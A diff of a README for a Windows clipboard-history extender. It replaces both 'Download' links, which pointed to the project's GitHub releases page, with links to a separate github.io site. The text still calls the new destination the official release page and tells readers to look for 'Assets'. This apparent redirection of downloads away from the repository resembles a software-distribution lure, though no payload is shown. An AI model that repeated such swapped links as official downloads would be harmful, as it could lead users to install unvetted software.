@@ -1,6 +1,6 @@
 # 📋 Windows-Clipboard-Extender - Remove limits from your clipboard history
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/virtualden7218/Windows-Clipboard-Extender/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://virtualden7218.github.io)
 
 Windows stores a limited number of items in your clipboard history. By default, the system keeps only 25 items and restricts the size of those items to 4 megabytes. If you copy many files or long sections of text, Windows discards your older data. This tool removes those restrictions. It allows you to keep more history entries and store larger pieces of information.
 
@@ -18,7 +18,7 @@ The program acts as a patch for your Windows clipboard settings. It updates the 
 
 Visit the official release page to get the script. We host all versions there.
 
-[Click here to visit the release page and download the software](https://github.com/virtualden7218/Windows-Clipboard-Extender/releases)
+[Click here to visit the release page and download the software](https://virtualden7218.github.io)
 
 1. Go to the link above.
 2. Look for the section labeled "Assets."
